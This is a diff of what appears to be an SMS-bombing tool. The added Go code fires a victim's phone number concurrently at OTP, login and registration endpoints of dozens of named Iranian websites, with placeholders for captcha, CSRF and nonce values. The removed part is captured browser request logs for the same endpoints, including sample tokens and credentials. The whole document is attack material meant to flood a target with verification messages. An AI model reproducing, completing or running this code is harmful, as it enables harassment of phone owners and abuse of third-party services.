@@ -1248,6 +1248,410 @@ martday.ir
 civapp.ir
 web-api.fafait.net
 api.payping.ir
+
+❌❌❌❌❌kar nakardand 7:
+// alibaba.ir (OTP - POST JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"phoneNumber": phone, // فرمت 09...
+				}
+				sendJSONRequest(c, ctx, "https://ws.alibaba.ir/api/v3/account/mobile/otp", payload, &wg, ch)
+			}
+		}(client)
+
+		// football360.ir verify-phone (Check - POST JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"phone_number": getPhoneNumberPlus98NoZero(phone), // فرمت +989...
+				}
+				sendJSONRequest(c, ctx, "https://football360.ir/api/auth/v2/verify-phone/", payload, &wg, ch)
+			}
+		}(client)
+
+		// football360.ir send_otp (OTP - POST JSON)
+		// توجه: این نقطه پایانی نیاز به "otp_token" دارد که احتمالا از "verify-phone" یا مرحله قبل دریافت می شود و در یک حلقه ساده کار نکند.
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"phone_number": getPhoneNumberPlus98NoZero(phone), // فرمت +989...
+					"otp_token": "PLACEHOLDER_OTP_TOKEN", // نیاز به توکن پویا
+					"auto_read_platform": "ST", // مقدار ثابت
+				}
+				sendJSONRequest(c, ctx, "https://football360.ir/api/auth/v2/send_otp/", payload, &wg, ch)
+			}
+		}(client)
+
+
+		// pubg-sell.ir (Login/OTP - POST Form)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("username", phone) // فرمت 09...
+				sendFormRequest(c, ctx, "https://pubg-sell.ir/loginuser", formData, &wg, ch)
+			}
+		}(client)
+
+		// api.vandar.io (Check/OTP - POST JSON)
+		// توجه: این نقطه پایانی نیاز به "captcha" دارد که بدون حل کپچا کار نخواهد کرد.
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"mobile": phone, // فرمت 09...
+					"captcha": "PLACEHOLDER_CAPTCHA_RESPONSE", // نیاز به حل کپچا
+					"captcha_provider": "CLOUDFLARE", // مقدار ثابت
+				}
+				sendJSONRequest(c, ctx, "https://api.vandar.io/account/v1/check/mobile", payload, &wg, ch)
+			}
+		}(client)
+
+		// safarmarket.com is_phone_available (Check - GET Query)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				// پارامتر phone مستقیماً در URL قرار می گیرد
+				urlWithQuery := fmt.Sprintf("https://safarmarket.com//api/security/v1/user/is_phone_available?phone=%s", url.QueryEscape(phone))
+				sendGETRequest(c, ctx, urlWithQuery, &wg, ch)
+			}
+		}(client)
+
+		// safarmarket.com otp (OTP - POST JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"phone": phone, // فرمت 09...
+				}
+				sendJSONRequest(c, ctx, "https://safarmarket.com//api/security/v2/user/otp", payload, &wg, ch)
+			}
+		}(client)
+
+		// app.inchand.com initialize (OTP - POST JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"mobile": phone, // فرمت 09...
+				}
+				sendJSONRequest(c, ctx, "https://app.inchand.com/api/v1/authentication/initialize", payload, &wg, ch)
+			}
+		}(client)
+
+		// bikoplus.com check-phone-number (Check - GET Query)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				// پارامتر phoneNumber مستقیماً در URL قرار می گیرد
+				urlWithQuery := fmt.Sprintf("https://bikoplus.com/api/client/v3/authentications/check-phone-number?phoneNumber=%s", url.QueryEscape(phone))
+				sendGETRequest(c, ctx, urlWithQuery, &wg, ch)
+			}
+		}(client)
+
+		// adinehbook.com sign-in (Login/OTP - POST Form)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				// فیلدهای دیگر از نمونه درخواست کاربر
+				formData.Set("path", "") // مقدار پیش فرض
+				formData.Set("action", "sign") // مقدار ثابت
+				formData.Set("phone_cell_or_email", phone) // فرمت 09...
+				formData.Set("login-submit", "تایید") // مقدار ثابت (ممکن است نیاز نباشد)
+				sendFormRequest(c, ctx, "https://www.adinehbook.com/gp/flex/sign-in.html", formData, &wg, ch)
+			}
+		}(client)
+
+		// maxbax.com send_code (OTP - POST Form)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("action", "bakala_send_code") // مقدار ثابت
+				formData.Set("phone_email", phone) // فرمت 09...
+				sendFormRequest(c, ctx, "https://maxbax.com/bakala/ajax/send_code/", formData, &wg, ch)
+			}
+		}(client)
+
+		// nalinoco.com login-register (OTP - POST Form)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("step", "1") // مقدار ثابت
+				formData.Set("ReturnUrl", "/") // مقدار ثابت
+				formData.Set("mobile", phone) // فرمت 09...
+				sendFormRequest(c, ctx, "https://www.nalinoco.com/api/customers/login-register", formData, &wg, ch)
+			}
+		}(client)
+
+		// kapanigold.com admin-ajax.php (OTP - POST Form)
+		// این نقطه پایانی از پلاگین Digits استفاده می کند و نیاز به فیلدهای مختلفی دارد.
+		// توجه: csrf و dig_nounce ممکن است پویا باشند.
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("action", "digits_check_mob") // مقدار ثابت
+				formData.Set("countrycode", "+98") // مقدار ثابت
+				formData.Set("mobileNo", getPhoneNumberNoZero(phone)) // فرمت 912...
+				formData.Set("csrf", "PLACEHOLDER_CSRF") // نیاز به مقدار پویا
+				formData.Set("login", "1") // مقدار ثابت
+				formData.Set("username", "") // مقدار پیش فرض
+				formData.Set("email", "") // مقدار پیش فرض
+				formData.Set("captcha", "") // ممکن است نیاز به کپچا داشته باشد
+				formData.Set("captcha_ses", "") // ممکن است نیاز به کپچا داشته باشد
+				formData.Set("digits", "1") // مقدار ثابت
+				formData.Set("json", "1") // مقدار ثابت
+				formData.Set("whatsapp", "0") // مقدار ثابت
+				formData.Set("mobmail", getPhoneNumberNoZero(phone)) // فرمت 912...
+				formData.Set("dig_otp", "") // مقدار پیش فرض
+				formData.Set("dig_nounce", "PLACEHOLDER_DIG_NOUNCE") // نیاز به مقدار پویا
+				sendFormRequest(c, ctx, "https://kapanigold.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+			}
+		}(client)
+
+		// lavinbg.com admin-ajax.php (Login/OTP - POST Form)
+		// این نقطه پایانی از پلاگین Digits استفاده می کند و نیاز به فیلدهای مختلفی دارد.
+		// توجه: instance_id, digits_form, _wp_http_referer ممکن است پویا باشند.
+		// این نقطه پایانی به نظر بخشی از فرآیند ورود/ثبت نام است و ممکن است به تنهایی OTP ارسال نکند.
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("login_digt_countrycode", "+98") // مقدار ثابت
+				formData.Set("digits_phone", getPhoneNumberNoZero(phone)) // فرمت 912...
+				formData.Set("digits_email", "") // مقدار پیش فرض
+				formData.Set("action_type", "phone") // مقدار ثابت
+				formData.Set("rememberme", "1") // مقدار ثابت
+				formData.Set("digits", "1") // مقدار ثابت
+				formData.Set("instance_id", "PLACEHOLDER_INSTANCE_ID") // نیاز به مقدار پویا
+				formData.Set("action", "digits_forms_ajax") // مقدار ثابت
+				formData.Set("type", "login") // مقدار ثابت (توجه: نوع login است نه register)
+				// فیلدهای دیگر از نمونه درخواست کاربر
+				formData.Set("digits_step_1_type", "")
+				formData.Set("digits_step_1_value", "")
+				formData.Set("digits_step_2_type", "")
+				formData.Set("digits_step_2_value", "")
+				formData.Set("digits_step_3_type", "")
+				formData.Set("digits_step_3_value", "")
+				formData.Set("digits_login_email_token", "")
+				formData.Set("digits_redirect_page", "//lavinbg.com/?page=2&redirect_to=https%3A%2F%2Flavinbg.com%2F") // مقدار ثابت
+				formData.Set("digits_form", "PLACEHOLDER_DIGITS_FORM") // نیاز به مقدار پویا
+				formData.Set("_wp_http_referer", "/") // ممکن است پویا باشد یا نیاز به URL کامل داشته باشد
+				formData.Set("show_force_title", "1") // مقدار ثابت
+				sendFormRequest(c, ctx, "https://lavinbg.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+			}
+		}(client)
+
+		// mofidteb.com auth (Login/OTP - POST JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"username": phone, // فرمت 09...
+					"terms_accepted": true, // مقدار ثابت
+				}
+				sendJSONRequest(c, ctx, "https://mofidteb.com/api/auth/auth", payload, &wg, ch)
+			}
+		}(client)
+
+		// webpoosh.com register (Registration/OTP - POST Form)
+		// توجه: _token ممکن است پویا باشد.
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("_token", "PLACEHOLDER_TOKEN") // نیاز به مقدار پویا
+				formData.Set("cellphone", phone) // فرمت 09...
+				sendFormRequest(c, ctx, "https://www.webpoosh.com/register", formData, &wg, ch)
+			}
+		}(client)
+
+		// masterkala.com otp (OTP - POST JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"type": "sendotp", // مقدار ثابت
+					"phone": phone, // فرمت 09...
+				}
+				sendJSONRequest(c, ctx, "https://masterkala.com/api/2.1.1.0.0/?route=profile/otp", payload, &wg, ch)
+			}
+		}(client)
+
+		// sensishopping.com admin-ajax.php (OTP - POST Form)
+		// این نقطه پایانی از پلاگین Digits استفاده می کند و نیاز به فیلدهای مختلفی دارد.
+		// توجه: csrf, instance_id, digits_form, _wp_http_referer ممکن است پویا باشند.
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("action", "digits_check_mob") // مقدار ثابت
+				formData.Set("countrycode", "+98") // مقدار ثابت
+				// این نمونه از یک فاصله در شماره تلفن استفاده کرده بود، اما بهتر است از شماره تمیز استفاده شود
+				formData.Set("mobileNo", getPhoneNumberNoZero(phone)) // فرمت 912...
+				formData.Set("csrf", "PLACEHOLDER_CSRF") // نیاز به مقدار پویا
+				formData.Set("login", "1") // مقدار ثابت
+				formData.Set("username", "") // مقدار پیش فرض
+				formData.Set("email", "") // مقدار پیش فرض
+				formData.Set("captcha", "") // ممکن است نیاز به کپچا داشته باشد
+				formData.Set("captcha_ses", "") // ممکن است نیاز به کپچا داشته باشد
+				formData.Set("digits", "1") // مقدار ثابت
+				formData.Set("json", "1") // مقدار ثابت
+				formData.Set("whatsapp", "0") // مقدار ثابت
+				formData.Set("mobmail", getPhoneNumberNoZero(phone)) // فرمت 912...
+				formData.Set("dig_otp", "") // مقدار پیش فرض
+				formData.Set("dig_nounce", "PLACEHOLDER_DIG_NOUNCE") // نیاز به مقدار پویا
+				sendFormRequest(c, ctx, "https://sensishopping.com/wp-admin/admin-ajax.php", formData, &wg, ch)
+			}
+		}(client)
+
+		// gruccia.ir login (Login/Register - POST Form)
+		// مشابه dolichi.com
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("back", "my-account")
+				formData.Set("username", phone) // فرمت 09...
+				// فیلدهای دیگر از نمونه درخواست کاربر
+				formData.Set("id_customer", "") // مقدار پیش فرض
+				formData.Set("firstname", "نام") // مقدار نمونه
+				formData.Set("lastname", "خانوادگی") // مقدار نمونه
+				// نمونه ایمیل و پسورد در این یکی نبود، اما برای register احتمالا لازم است
+				// formData.Set("email", "example@example.com")
+				// formData.Set("password", "1234567890")
+				formData.Set("action", "register") // مقدار ثابت
+				formData.Set("ajax", "1") // مقدار ثابت
+				sendFormRequest(c, ctx, "https://gruccia.ir/login?back=my-account", formData, &wg, ch)
+			}
+		}(client)
+
+		// mobilexpress.ir admin-ajax.php (POST Form - Step 1 Login check)
+		// این نقطه پایانی از پلاگین Digits استفاده می کند و نیاز به فیلدهای مختلفی دارد.
+		// توجه: instance_id, digits_form, _wp_http_referer ممکن است پویا باشند.
+		// این نقطه پایانی به نظر بخشی از فرآیند ورود/ثبت نام است و ممکن است به تنهایی OTP ارسال نکند.
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("login_digt_countrycode", "+98") // مقدار ثابت
+				formData.Set("digits_phone", getPhoneNumberNoZero(phone)) // فرمت 912...
+				formData.Set("action_type", "phone") // مقدار ثابت
+				formData.Set("digits", "1") // مقدار ثابت
+				formData.Set("instance_id", "PLACEHOLDER_INSTANCE_ID") // نیاز به مقدار پویا
+				formData.Set("action", "digits_forms_ajax") // مقدار ثابت
+				formData.Set("type", "login") // مقدار ثابت
+				// فیلدهای دیگر از نمونه درخواست کاربر
+				formData.Set("digits_step_1_type", "")
+				formData.Set("digits_step_1_value", "")
+				formData.Set("digits_step_2_type", "")
+				formData.Set("digits_step_2_value", "")
+				formData.Set("digits_step_3_type", "")
+				formData.Set("digits_step_3_value", "")
+				formData.Set("digits_login_email_token", "")
+				formData.Set("digits_redirect_page", "//mobilexpress.ir/") // مقدار ثابت
+				formData.Set("digits_form", "PLACEHOLDER_DIGITS_FORM") // نیاز به مقدار پویا
+				formData.Set("_wp_http_referer", "/") // ممکن است پویا باشد یا نیاز به URL کامل داشته باشد
+				formData.Set("show_force_title", "1") // مقدار ثابت
+				sendFormRequest(c, ctx, "https://mobilexpress.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
+			}
+		}(client)
+
+		// mobilexpress.ir admin-ajax.php (POST Form - Step 2 Register/Send OTP)
+		// این نقطه پایانی به نظر مرحله دوم ثبت نام یا ارسال OTP است.
+		// نیاز به فیلدهای مشابه مرحله 1 و احتمالا توکن ها یا کوکی های آن مرحله دارد.
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("login_digt_countrycode", "+98") // مقدار ثابت
+				formData.Set("digits_phone", getPhoneNumberNoZero(phone)) // فرمت 912...
+				formData.Set("action_type", "phone") // مقدار ثابت
+				formData.Set("digits_reg_name", "testname") // مقدار نمونه
+				formData.Set("digits_process_register", "1") // مقدار ثابت
+				formData.Set("sms_otp", "") // مقدار پیش فرض
+				formData.Set("digits_otp_field", "1") // مقدار ثابت
+				formData.Set("digits", "1") // مقدار ثابت
+				formData.Set("instance_id", "PLACEHOLDER_INSTANCE_ID") // نیاز به مقدار پویا (احتمالا همان مرحله 1)
+				formData.Set("action", "digits_forms_ajax") // مقدار ثابت
+				formData.Set("type", "login") // مقدار ثابت (هنوز نوع login است)
+				// فیلدهای دیگر از نمونه درخواست کاربر
+				formData.Set("digits_step_1_type", "")
+				formData.Set("digits_step_1_value", "")
+				formData.Set("digits_step_2_type", "")
+				formData.Set("digits_step_2_value", "")
+				formData.Set("digits_step_3_type", "")
+				formData.Set("digits_step_3_value", "")
+				formData.Set("digits_login_email_token", "")
+				formData.Set("digits_redirect_page", "//mobilexpress.ir/") // مقدار ثابت
+				formData.Set("digits_form", "PLACEHOLDER_DIGITS_FORM") // نیاز به مقدار پویا (احتمالا همان مرحله 1)
+				formData.Set("_wp_http_referer", "/") // ممکن است پویا باشد یا نیاز به URL کامل داشته باشد
+				formData.Set("show_force_title", "1") // مقدار ثابت
+				formData.Set("container", "digits_protected") // مقدار ثابت
+				formData.Set("sub_action", "sms_otp") // مقدار ثابت
+				sendFormRequest(c, ctx, "https://mobilexpress.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
+			}
+		}(client)
+
+		// api.beroozmart.com check-user (Check - POST JSON)
+		// این نقطه پایانی به نظر مرحله چک کردن وجود کاربر است و ممکن است به تنهایی OTP ارسال نکند.
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"username": getPhoneNumberPlus98NoZero(phone), // فرمت +989...
+				}
+				sendJSONRequest(c, ctx, "https://api.beroozmart.com/api/pub/account/check-user", payload, &wg, ch)
+			}
+		}(client)
+
+		// api.beroozmart.com send-otp (OTP - POST JSON)
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"mobile": phone, // فرمت 09...
+					"sendViaSms": true, // مقدار ثابت
+					"email": nil, // مقدار ثابت
+					"sendViaEmail": false, // مقدار ثابت
+				}
+				sendJSONRequest(c, ctx, "https://api.beroozmart.com/api/pub/account/send-otp", payload, &wg, ch)
+			}
+		}(client)
+
+		// 2nabsh.com checkUsername (Check - POST Form)
+		// توجه: _token ممکن است پویا باشد. این نقطه پایانی به نظر مرحله چک کردن نام کاربری است.
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				formData := url.Values{}
+				formData.Set("username", phone) // فرمت 09...
+				formData.Set("just_verify_mobile", "false") // مقدار ثابت
+				formData.Set("_token", "PLACEHOLDER_TOKEN") // نیاز به مقدار پویا
+				sendFormRequest(c, ctx, "https://www.2nabsh.com/auth/checkUsername", formData, &wg, ch)
+			}
+		}(client)
+
+		// api.sibche.com sendCode (OTP - POST JSON)
+		// توجه: نیاز به "g-recaptcha-response" دارد که بدون حل کپچا کار نخواهد کرد.
+		wg.Add(1)
+		tasks <- func(c *http.Client) func() {
+			return func() {
+				payload := map[string]interface{}{
+					"mobile": phone, // فرمت 09...
+					"spec-g": nil, // مقدار ثابت
+					"g-recaptcha-response": "PLACEHOLDER_RECAPTCHA_RESPONSE", // نیاز به حل کپچا
+				}
+				sendJSONRequest(c, ctx, "https://api.sibche.com/profile/sendCode", payload, &wg, ch)
+			}
+		}(client)
 ---------------------------------------------------------------------------------------------
 ---------------------------------------------------------------------------------------------
 ---------------------------------------------------------------------------------------------
@@ -1410,808 +1814,6 @@ def ragham(num, proxies):
 
 
 
-
----------------------------------------------------------------------------------------------
-Request URL:
-https://ws.alibaba.ir/api/v3/account/mobile/otp
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-45.89.201.11:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-{phoneNumber: "09123456456"}
-phoneNumber
-: 
-"09123456456"
----------------------------------------------------------------------------------------------
-1:
-Request URL:
-https://football360.ir/api/auth/v2/verify-phone/
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.143.232.124:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-{phone_number: "+989123456456"}
-phone_number
-: 
-"+989123456456"
-
-2:
-Request URL:
-https://football360.ir/api/auth/v2/send_otp/
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.143.232.124:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-{phone_number: "+989123456456", otp_token: "RL9veY33SPFHfkMsshUcsA01", auto_read_platform: "ST"}
-auto_read_platform
-: 
-"ST"
-otp_token
-: 
-"RL9veY33SPFHfkMsshUcsA01"
-phone_number
-: 
-"+989123456456"
----------------------------------------------------------------------------------------------
-Request URL:
-https://pubg-sell.ir/loginuser
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-46.4.67.240:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-username: 09123456456
----------------------------------------------------------------------------------------------
-Request URL:
-https://pirankalaco.ir/SendPhone.php
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-89.32.248.38:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-phone: 09123456456
----------------------------------------------------------------------------------------------
-Request URL:
-https://api.vandar.io/account/v1/check/mobile
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.143.232.201:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-{mobile: "09123456456",…}
-captcha
-: 
-"0.2JlyjSu-AEZP_gaxKAo3QzGTsO46ZUpvOq4egaO5QLF1HQZIPVc54Hl74WNLtSz59eK9-7vNc1wHVLnTEwZG_mJ6bV2Glq4syl8RdrplKiuYtgAKrIMvBKVW7BeAnXOnj-1HYdA5hpM78CO44p7DqB0iJJY7q9H_cJh5pgZESPBo_NczoC6NZ4_ltegLe8ZWEN69ozwDzzfqc0bdDgJ9891bZ3Um7kgh7Uv9wYhPeod_EtAliYitInjYyBabcDbj-jhd24lCLxzmhfiIpk9tXEgwn3I17f1LA_0f7zPzsRhOwy3fFvKTrhBuIUqqGm74SOxgxbSuvRyq5MZHDSNi1nqmf2JQSv75xN5l9-FdmUwEXGnO9EkmiyEL9l2ltsq3v2oD_3AetsFEWFSSKwd9EpY_HtMXfIHLKMayb6XDWQWzwWZqWlZbrFJqqTaQcytu8xB5yGestdYaqjompJ7i0OISFRF69XnN59sDyvRZQGhY0Y-WozcsP9J5mwGcdKoRdfTxTeevC4yyD3DfMeehIrzUMaRj3WHAhdWHpsi8JkEev--dEe5P9_PSnuG-9j2QrCgUHd-XZSy_cv-_Tptt-gC8FI-aidNtI3BzzuDToEBww0ClfoBmAR9FAiWthd6ArmHrzVXKdb233Sxt0f18xsPgnLgB76buX8SwObZq8QPCxKOMm-JDxFm0bnJDzAa2Dq6PsQrJjSCfgEFGhHyBdEZFz9h-mc3A2E29j7ihNcqodYoO1vQUsCfk_DNxMoIFuvQUYzguFckw-uCOf2_zZ4ewEUFBJHnByQF5K-qdaN4r4yTEOdwMzRaMrS1viUeVzHPawwicCYqacxEgEak0bxpXlysHpJL7gr2e5Pfc7TQ.ZgbgMH_LPHEwbwA_Mx-e0w.e2782cb88484a61158d341a289e17c3a550c342792835e690a271a9d932c569f"
-captcha_provider
-: 
-"CLOUDFLARE"
-mobile
-: 
-"09123456456"
----------------------------------------------------------------------------------------------
-Request URL:
-https://www.dolichi.com/login?back=my-account
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-31.214.250.234:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-back: my-account
-username: 09123456456
-id_customer: 
-back: 
-firstname: بثعاهبتنب
-lastname: ببعباثعبهث
-email: koyakef766@kazvi.com
-password: 1234567890
-action: register
-back: my-account
-ajax: 1
----------------------------------------------------------------------------------------------
-1:
-Request URL:
-https://safarmarket.com//api/security/v1/user/is_phone_available?phone=09123456456
-Request Method:
-GET
-Status Code:
-200 OK
-Remote Address:
-185.143.235.201:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-phone: 09123456456
-
-
-2:
-Request URL:
-https://safarmarket.com//api/security/v2/user/otp
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.143.235.201:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-{phone: "09123456456"}
-phone
-: 
-"09123456456"
-
-3:
-Request URL:
-https://recaptcha.safarmarket.com/api/v1/create
-Request Method:
-GET
-Status Code:
-200 OK
-Remote Address:
-185.143.232.201:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-{id: "1cec84db-b688-4637-a084-57d449a3446e", success: true}
-id
-: 
-"1cec84db-b688-4637-a084-57d449a3446e"
-success
-: 
-true
----------------------------------------------------------------------------------------------
-Request URL:
-https://app.inchand.com/api/v1/authentication/initialize
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.143.235.201:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-{mobile: "09123456456"}
-mobile
-: 
-"09123456456"
----------------------------------------------------------------------------------------------
-1:
-Request URL:
-https://bikoplus.com/api/client/v3/authentications/check-phone-number?phoneNumber=09123456456
-Request Method:
-GET
-Status Code:
-200 OK
-Remote Address:
-185.8.173.44:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-
-phoneNumber: 09123456456
-
-
-2:
-Request URL:
-https://bikoplus.com/login/otp?_rsc=2h7h9
-Request Method:
-GET
-Status Code:
-200 OK
-Remote Address:
-185.8.173.44:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-_rsc: 2h7h9
----------------------------------------------------------------------------------------------
-1:
-Request URL:
-https://titomarket.com/fa-ir/index.php?route=extension/websky_otp/module/websky_otp.send_code&emailsend=0
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.164.72.189:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-route: extension/websky_otp/module/websky_otp.send_code
-emailsend: 0
-telephone: 09123456456
-
-2:
-Request URL:
-https://titomarket.com/fa-ir/index.php?route=extension/websky_otp/module/websky_otp.verify_design&telephone=09123456456&emailsend=0
-Request Method:
-GET
-Status Code:
-200 OK
-Remote Address:
-185.164.72.189:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-
-route: extension/websky_otp/module/websky_otp.verify_design
-telephone: 09123456456
-emailsend: 0
----------------------------------------------------------------------------------------------
-Request URL:
-https://techsiro.com/send-otp
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.208.182.237:443
-Referrer Policy:
-no-referrer-when-downgrade
-
-mobile: 09123456456
-client: web
-method: POST
-_token: iltpWHZFZDrK78xWKAGkV7muplA0Sk3DDzqP6fG1
----------------------------------------------------------------------------------------------
-Request URL:
-https://www.adinehbook.com/gp/flex/sign-in.html
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-94.232.174.244:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-
-path: 
-action: sign
-phone_cell_or_email: 09123456456
-login-submit: تایید
----------------------------------------------------------------------------------------------
-Request URL:
-https://maxbax.com/bakala/ajax/send_code/
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-46.245.78.154:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-action: bakala_send_code
-phone_email: 09123466456
-
----------------------------------------------------------------------------------------------
-Request URL:
-https://www.nalinoco.com/api/customers/login-register
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-31.7.79.68:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-step: 1
-ReturnUrl: /
-mobile: 09123456456
----------------------------------------------------------------------------------------------
-Request URL:
-https://narsisbeauty.com/wp-admin/admin-ajax.php
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-31.214.251.228:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-phone_number: 09123456789
-wupp_remember_me: on
-action: wupp_sign_up
----------------------------------------------------------------------------------------------
-Request URL:
-https://kapanigold.com/wp-admin/admin-ajax.php
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-87.236.210.4:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-action: digits_check_mob
-countrycode: +98
-mobileNo: 9123456456
-csrf: 0ac799ee6b
-login: 1
-username: 
-email: 
-captcha: 
-captcha_ses: 
-digits: 1
-json: 1
-whatsapp: 0
-mobmail: 9123456456
-dig_otp: 
-dig_nounce: 0ac799ee6b
----------------------------------------------------------------------------------------------
-Request URL:
-https://skmei-iran.com/api/customer/member/register/
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-94.182.154.67:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-email: 09123456456
----------------------------------------------------------------------------------------------
-Request URL:
-https://api.123kif.com/api/auth/Register
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.143.235.201:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-{mobile: "09123456789", password: "stdtrfrf", firstName: "fbgvtfg", lastName: "ryfvfbvbt",…}
-firstName
-: 
-"fbgvtfg"
-lastName
-: 
-"ryfvfbvbt"
-mobile
-: 
-"09123456789"
-password
-: 
-"stdtrfrf"
-platform
-: 
-"web"
-refferCode
-: 
-""
----------------------------------------------------------------------------------------------
-Request URL:
-https://lavinbg.com/wp-admin/admin-ajax.php
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-89.32.248.89:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-login_digt_countrycode: +98
-digits_phone: 9123456456
-digits_email: 
-action_type: phone
-rememberme: 1
-digits: 1
-instance_id: 7f6c73277ab9794c635ffcf5dc32c15a
-action: digits_forms_ajax
-type: login
-digits_step_1_type: 
-digits_step_1_value: 
-digits_step_2_type: 
-digits_step_2_value: 
-digits_step_3_type: 
-digits_step_3_value: 
-digits_login_email_token: 
-digits_redirect_page: //lavinbg.com/?page=2&redirect_to=https%3A%2F%2Flavinbg.com%2F
-digits_form: 1c256ae905
-_wp_http_referer: /?login=true&page=2&redirect_to=https%3A%2F%2Flavinbg.com%2F
-show_force_title: 1
----------------------------------------------------------------------------------------------
-Request URL:
-https://mofidteb.com/api/auth/auth
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-37.156.146.123:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-{username: "09123456789", terms_accepted: true}
-terms_accepted
-: 
-true
-username
-: 
-"09123456789"
----------------------------------------------------------------------------------------------
-Request URL:
-https://www.webpoosh.com/register
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-185.143.235.201:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-_token: fkG3kMEmX9oO2ypmJxvjqGKbYXDm0Pq827fZnko5
-cellphone: 09123456456
----------------------------------------------------------------------------------------------
-Request URL:
-https://hoomangold.com/panel/?endp=step-2
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-85.9.111.123:443
-Referrer Policy:
-strict-origin-when-cross-origin
-
-endp: step-2
-redirect_to: 
-action: nirweb_panel_login_form
-nirweb_panel_username: 09123456456
----------------------------------------------------------------------------------------------
-Request URL:
-https://masterkala.com/api/2.1.1.0.0/?route=profile/otp
-Request Method:
-POST
-Status Code:
-200 OK
-Remote Address:
-79.127.127.47:443
-Referrer Policy:
-no-referrer
-
-route: profile/otp
-{type: "sendotp", phone: "09123466456"}
-phone
-: 
-"09123466456"
-type
-: 
-"sendotp"
